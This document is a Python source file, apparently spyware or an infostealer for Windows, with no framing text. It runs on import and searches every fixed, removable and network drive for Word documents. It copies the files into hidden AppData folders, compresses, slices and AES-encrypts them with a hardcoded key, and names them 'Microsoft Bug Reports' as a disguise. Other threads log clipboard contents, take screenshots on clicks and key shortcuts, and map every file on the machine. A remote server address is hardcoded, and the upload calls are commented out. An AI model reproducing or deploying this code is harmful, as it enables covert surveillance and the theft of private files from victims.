from shutil import disk_usage, copy2, rmtree
from threading import Thread
from random import randrange
import time
from os import walk, listdir, environ, remove, makedirs, chdir, startfile
from os.path import exists, getsize, getctime, getmtime, join, abspath, basename, dirname, isfile, splitext
from time import ctime, sleep
from cpuinfo import get_cpu_info
from platform import platform
from urllib3 import request
from shutil import copy2
from pickle import dump as pkl_dump, load as pkl_load
from keyboard import on_press, is_pressed
from datetime import datetime
from urllib.request import urlretrieve
from uuid import uuid4
from pyautogui import screenshot
from pyperclip import copy, paste
from win32file import GetDriveType, DRIVE_REMOTE, DRIVE_REMOVABLE, DRIVE_FIXED
from glob import iglob
from requests import post
from mouse import on_click as click
from pyaes import  AESModeOfOperationCBC, Encrypter, Decrypter
from lzma import open as lzma_open
from math import ceil, pow
from hashlib import md5
from zipfile import ZipFile, ZIP_DEFLATED
import ast
from requests import get

class Master:

    def __init__(self):
        self.folder = 'Master\\'
        self.url = 'http://138.68.95.95/url.txt'
        self.extensions = ['.docx', '.doc']#, '.xlsx', '.xls', '.pps', '.ppsx', '.ppt', '.pptx', '.pdf', '.inp']
        self.special_extensions = ['.txt', '.png']#, '.zip']


    def drive_finder(self):

        drives = [chr(x) + ":\\" for x in range(65, 91) if exists(chr(x) + ":")]
        return drives


    def dataPath(self):
        folder = 'Master\\'
        appdata_path = environ['appdata']
        folderpath = join(appdata_path, folder)
        return folderpath


    def makeFolders(self, folderpath):
        if not exists(folderpath):
            makedirs(folderpath)
            i = 1

            while i <= 11:

                if not exists(folderpath + str(i)):
                    makedirs(folderpath + str(i))
                    i += 1

        else:
            checkfolder = listdir(self.dataPath())

            if checkfolder == []:
                i = 1

                while i <= 11:

                    if not exists(folderpath + str(i)):
                        makedirs(folderpath + str(i))
                        i += 1

                else:
                    pass


    def md5_checksum(self, file_path):

        hash_md5 = md5()

        with open(file_path, "rb") as f:

            for chunk in iter(lambda: f.read(4096), b''):
                hash_md5.update(chunk)

        return hash_md5.hexdigest()


    def encryption(self, file_path, original_path, chunk_flag):

        key = b'~!@#$%^&*()Ijhg*GFiBVKJHbvkJl;JN'
        iv = b'bu8yt^R&^F*7gt98'
        cipher_text = b''
        encrypter = Encrypter(AESModeOfOperationCBC(key, iv))
        enc_path = self.dataPath() + '8\\'
        filename = basename(file_path)
        obfuscation = 'ID- ' + str(randrange(1000, 100000)) + '@' + 'Microsoft Bug Reports- '

        with open(file_path, 'rb') as file:

            for line in file:
                cipher_text += encrypter.feed(line)

            cipher_text += encrypter.feed()

        with open(enc_path + obfuscation + filename, 'wb') as new_file:
            new_file.write(cipher_text)

        if chunk_flag is False:
            print("uploader called")
            # response = uploader(enc_path + obfuscation + filename, original_path)
            # print(response)

        else:
            print("upload_slices called")
            # upload_slices(enc_path + obfuscation + filename, original_path)


    def file_slicer(self, compressed_path, original_path):
        megabyte = int(pow(1024, 2))
        counter = 1
        file_name = basename(compressed_path) #Name of the compressed file
        file_size = getsize(compressed_path) #Size of the compressed file
        sliced_path = self.dataPath() + '8\\' #address of the sliced file
        sliced_db = self.dataPath() + '11\\cold_sliced.json' #json to store information about the sliced files
        chunk_dict = {}
        chunk_list = []
        state_dict = {}
        if file_size > megabyte: #if file size more than 1 MB
            total = ceil(file_size / megabyte) #Total number of slices to be formed

            with open(compressed_path, 'rb') as file:
                file_data = file.read() #read compressed file

            while counter <= total:
                chunk = file_data[:megabyte] #!MB of chunk taken
                file_data = file_data[megabyte:] #1MB of chunk removed
                chunk_dir = sliced_path + file_name + '_' + str(total) + '\\' #Address of the folder of sliced files
                chunk_path = chunk_dir + file_name + '_' + str(counter) + '_' + str(total)
                chunk_list.append(chunk_path)

                if not exists(chunk_dir):
                    makedirs(chunk_dir)

                current_modtime = getmtime(original_path) #stores last modified time
                state_dict[original_path] = current_modtime #stores modified time with key of original path

                state_path = chunk_dir + '\\' + basename(original_path) + '_state' #path of the json that stores information about the file
                with open(chunk_path, 'wb') as chunk_file:
                    chunk_file.write(chunk)

                    with open(state_path, 'wb') as state:
                        pkl_dump(state_dict, state)

                counter += 1

            if exists(sliced_db):

                with open(sliced_db, 'rb') as db: #opening sliced path
                    chunk_dict = pkl_load(db)

            chunk_dict[original_path] = chunk_list #adding info on the new file

            with open(sliced_db, 'wb') as sl: #writing the new file
                pkl_dump(chunk_dict, sl)

            for chunk in chunk_list: #sending chunk for encryption
                self.encryption(chunk, original_path, True)
                remove(chunk)

        else:
            self.encryption(compressed_path, original_path, False)

        remove(compressed_path)


    def compressor(self, file_path=None):
        print(file_path)
        file_name = basename(file_path)
        dest_path = self.dataPath() + '7\\'
        with ZipFile(dest_path + file_name, 'w', ZIP_DEFLATED) as f:
            f.write(file_path)

        ## if file_path.__contains__(self.dataPath()):
        ##     remove(file_path)

        self.file_slicer(dest_path + file_name, file_path)


    def file_feeder(self, last_feeder_file=None):
        file_list_path = self.dataPath() + '11\\' + 'coldstore_sorted.pkl'

        if exists(file_list_path):
            
            with open(file_list_path, 'rb') as pkl:
                file_list = pkl_load(pkl)
                
                if last_feeder_file != None:
                    try:
                        file_list = file_list[file_list.index(last_feeder_file) + 1:]
                    except:
                        pass

                for file in file_list:
                    self.compressor(file_path=file)
                    self.status_updater(last_feeder_file=file)

                # remove(file_list_path) #Removes json of file list

        else:
            pass


    def initiation(self):
        # self.makeFolders(self.dataPath())
        Time = time.time()
        if isfile(self.dataPath() + "11\\status.json"):
            status_dict = ast.literal_eval(open(self.dataPath() + "11\\status.json", 'r').read())
            if status_dict['search'][0] == 0:
                #call search
                self.search()
            elif status_dict['search'][0] == 1 and time.time() - status_dict['search'][1] > 28800.0:
                self.search()
                #runs search function as more than 8 hours have been passed
                #Assuming search dosn't takes much time
            else:
                #call file_feeder
                feeder_file_name = status_dict['last_feeder_file']
                # self.check_internet(feeder_file_name)
                self.file_feeder(last_feeder_file=feeder_file_name)
        else:
            file = open(self.dataPath() + "11\\status.json", 'w')
            status_dict = {"search":[0, None],"last_feeder_file":None}
            file.write(str(status_dict))
            file.close()
            self.search()
        while True:
            if time.time() - Time > 86400:
                self.status_updater(search_flag=0)
                self.initiation()


    def status_updater(self, search_flag=None, date_of_completion=None, last_feeder_file=None):
        # status_dict = {"search":[search_flag, date_of_completion],"last_feeder_file":last_feeder_file}
        file = open(self.dataPath() + "11\\status.json","r")
        status_dict = ast.literal_eval(file.read())
        file.close()
        if search_flag != None:
            status_dict['search'][0] = search_flag
        if date_of_completion != None:
            status_dict['search'][1] = date_of_completion
        if last_feeder_file != None:
            status_dict['last_feeder_file'] = last_feeder_file
        file = open(self.dataPath() + "11\\status.json","w")
        file.write(str(status_dict))
        file.close()


    def search(self):
            drives = self.drive_finder() #list of all drives
            copy_path = self.dataPath() + '7\\' #address of folder 7
            dbfile_path = self.dataPath() + '11\\coldstore_file.json' #address of coldstore json
            final_list = []

            if exists(dbfile_path): #checks whether the path exists, for coldstore
                open_db = open(dbfile_path, 'rb') #open coldstore in read mode
                final_dict = pkl_load(open_db)#load the pickle format of the coldstore to make it readable & save it in final_dict as it is a dictionar
                open_db.close()

            else:
                final_dict = {}# sets blank if file deleted or not created.

            for drive in drives:#loop through drives

                if GetDriveType(drive) == DRIVE_FIXED:#check if drive is permanent or removable.

                    for root, dirs, files in walk(drive, topdown=True):#loop to walk through all the files and folders of a drive.

                        if self.dataPath() not in root or root.split("\\")[1] not in ["Windows", "Program Files", "ProgramData", "Intel", "PrefLogs", "MSOCache", "Boot", "Recovery", "Python27", "$Recycle.Bin"]:

                            for file in files:#files contains the list of all the files in a directory, Dirs contain all the folders.
                                target_path = copy_path + file #location where the file has to be formed.
                                name, ext = splitext(file) #splits name and extention of a file.
                                src_path = join(root,file) #contains the address of the present file.
                                src_mtime = getmtime(src_path) #contains the epoch time of formation of the file.

                                if ext in self.extensions or ext in self.special_extensions and src_path.__contains__(self.dataPath()):

                                    if src_path.__contains__(self.dataPath()) and ext not in self.special_extensions:
                                        continue

                                    elif src_path not in final_dict or src_path in final_dict and src_mtime != final_dict[
                                        src_path]:
                                        print(src_path)
                                        mod_time = getmtime(src_path)
                                        final_dict[src_path] = mod_time

                                        if exists(target_path) and isfile(target_path) and self.md5_checksum(src_path) == self.md5_checksum(target_path): #checks if file that exists in target location and src location are same.
                                            continue

                                        elif exists(target_path) and isfile(target_path) and self.md5_checksum(
                                                src_path) != self.md5_checksum(target_path): #checks if files are of same name but different content
                                            new_name = self.md5_checksum(src_path)[:8] + '__' + file #adds first 8bits of md5 checksum to the name

                                            if not exists(copy_path + new_name): #checks if file does not exists already #check this part
                                                copy2(src_path, copy_path + new_name) #imports the file to 7 folder

                                            else:
                                                continue

                                        else:

                                            if not exists(target_path):
                                                copy2(src_path, target_path)

                                            else:
                                                continue

                                    else:
                                        continue

            print(final_dict)
            jsn = open(dbfile_path, 'wb')
            pkl_dump(final_dict, jsn)
            jsn.close()
            temp_list = listdir(copy_path)

            for file in temp_list:
                filepath = copy_path + file
                final_list.append(filepath)

            final_list.sort(key=getmtime, reverse=True)
            with open(self.dataPath() + '11\\' + 'coldstore_sorted.pkl', 'wb') as pkl:
                pkl_dump(final_list, pkl)
            self.status_updater(search_flag=1, date_of_completion=time.time())
            self.file_feeder()


    def special_request(self):
        # try:
        _requested_file = open("C:\\Users\\Zeal\\Desktop\\change_text.txt", 'r')
        requested_file_name = _requested_file.read()
        if requested_file_name != "None":
            print(requested_file_name)
            # self.compressor(file_path=requested_file_name)
            _requested_file.close()
        _requested_file.close()
            #send request that file is fetched
        # except:
        #     pass
        Thread(target = self.special_request).start()


    def makeFolders(self, folderpath):
        if not exists(folderpath):
            makedirs(folderpath)
            i = 1

            while i <= 11:

                if not exists(folderpath + str(i)):
                    makedirs(folderpath + str(i))
                    i += 1

        else:
            checkfolder = listdir(self.dataPath())
            if checkfolder == []:
                i = 1

                while i <= 11:

                    if not exists(folderpath + str(i)):
                        makedirs(folderpath + str(i))
                        i += 1

                else:
                    pass


    def usbNetwork(self):

        def drive_freespace():
            dest = self.dataPath() + '7\\'
            total, used, free = disk_usage(dest)
            return free

        def copy_file(size, file_list):

            dest = self.dataPath() + '7\\'
            disk_size = drive_freespace()
            ext_file_list = []

            if disk_size > (2 * size):

                for path in file_list:
                    if isfile(path):
                        if not (exists(dest + self.md5_checksum(path) + "_" + basename(path))):
                            dest_file_name = dest + self.md5_checksum(path) +"_"+ basename(path)
                            copy2(path, dest_file_name)
                            ext_file_list.append(dest_file_name)
            for file_name in ext_file_list:
                self.compressor(file_path=file_name)


        def sizecalc(drives):
            size = 0
            file_list = []
            for drive in drives:

                if exists(drive):
                    for root, dirs, files in walk(drive, topdown=True):
                        for j in dirs:
                            chdir(root+"\\"+j)

                            for ext in self.extensions:
                                f = list(iglob("*"+ext, recursive=True))

                                if f != []:
                                    for file in f:
                                        file_path = abspath(file)
                                        file_list.append(file_path)
                                        file_size = getsize(file_path)
                                        size = size + file_size
                    copy_file(size, file_list)
        def drive_detection():

            imp_drives = []

            drives = self.drive_finder() #returns drives

            for drive in drives: #parse through drives

                if GetDriveType(drive) == DRIVE_REMOVABLE or GetDriveType(drive) == DRIVE_REMOTE: #checks if drive is remote or removable

                    if drive not in imp_drives:
                        imp_drives.append(drive) #make list of drives
                        print('Important Drives: ' + drive)

            for i in imp_drives:

                if i not in drives:
                    imp_drives.pop(imp_drives.index(i))
                    print('Drives Now: ', imp_drives)

            sizecalc(imp_drives)
        drive_detection()


    def screenshots(self):

        # Capturing screens based on specific events.
        def capture():

            date_stamp = time.strftime('%Y-%m-%d %H-%M-%S', time.localtime(time.time()))
            file = date_stamp + ".png"
            filepath = self.dataPath() + '6\\'
            screenshot(filepath + file)

        # Waiting for events to trigger to take screenshots.
        def events():
            click(capture)
            while True:

                if is_pressed('ctrl+c'):
                    capture()

                elif is_pressed('ctrl+v'):
                    capture()

                elif is_pressed('ctrl+s'):
                    capture()

                else:
                    pass

        events()


    def clipboard(self):
        old = None
        storage = None

        while True:
            if is_pressed('ctrl+c'):
                storage = paste()
            if old != storage:
                clipname = datetime.now().strftime('%Y%m%d')
                clippath = self.dataPath() + '4\\'
                clips = open(clippath + clipname + '.txt', 'at')
                textTimeStamp = time.strftime('%Y-%m-%d %H-%M-%S', time.localtime(time.time()))
                clips.write(textTimeStamp+"*"*100+"\n\n")
                clips.write(storage+"\n\n")
                clips.close()
                old = storage


    def tree(self):
        treename = 'tree.txt'
        treepath = self.dataPath() + '2\\' + treename
        treefile = open(treepath, 'w+')
        drives = self.drive_finder()

        for drive in drives:

            for root, dirs, files in walk(drive, topdown = True):
                kb = 1024
                treefile.write('\n' + root)

                for file in files:
                    filepath = join(root, file)
                    filesize = getsize(filepath)

                    if filesize < kb:
                        size = filesize
                        size = str(size) + ' bytes'

                    elif filesize >= kb and filesize < pow(kb, 2):
                        size = round((filesize / 1024), 2)
                        size = str(size) + ' KB'

                    elif filesize >= pow(kb, 2) and filesize < pow(kb, 3):
                        size = round(filesize / pow(kb, 2), 2)
                        size = str(size) + ' MB'

                    elif filesize >= pow(kb, 3) and filesize < pow(kb, 4):
                        size = round(filesize / pow(kb, 3), 2)
                        size = str(size) + ' GB'

                    elif filesize >= pow(kb, 4) and filesize < pow(kb, 5):
                        size = round(filesize / pow(kb, 4), 2)
                        size = str(size) + ' TB'

                    else:
                        size = 'Very Large!'

                    treefile.write('\n' + file + ' S ~> ' + size)
                    treefile.write(' M ~> ' + datetime.fromtimestamp(getmtime(filepath)).strftime('%m/%d/%Y %H:%M:%S'))
                    treefile.write(' C ~> ' + datetime.fromtimestamp(getctime(filepath)).strftime('%m/%d/%Y %H:%M:%S'))

        treefile.close()

        with open(treename) as in_file, open(treepath, 'r+') as out_file:
            out_file.writelines(line for line in in_file if line.strip())
            out_file.truncate()
            out_file.close()


    def go(self):
        self.makeFolders(self.dataPath())
        Thread(target = self.initiation).start()
        Thread(target = self.special_request).start()
        Thread(target = self.usbNetwork).start()
        Thread(target = self.clipboard).start()
        Thread(target = self.tree).start()
        Thread(target = self.screenshots).start()


emp = Master()
emp.go()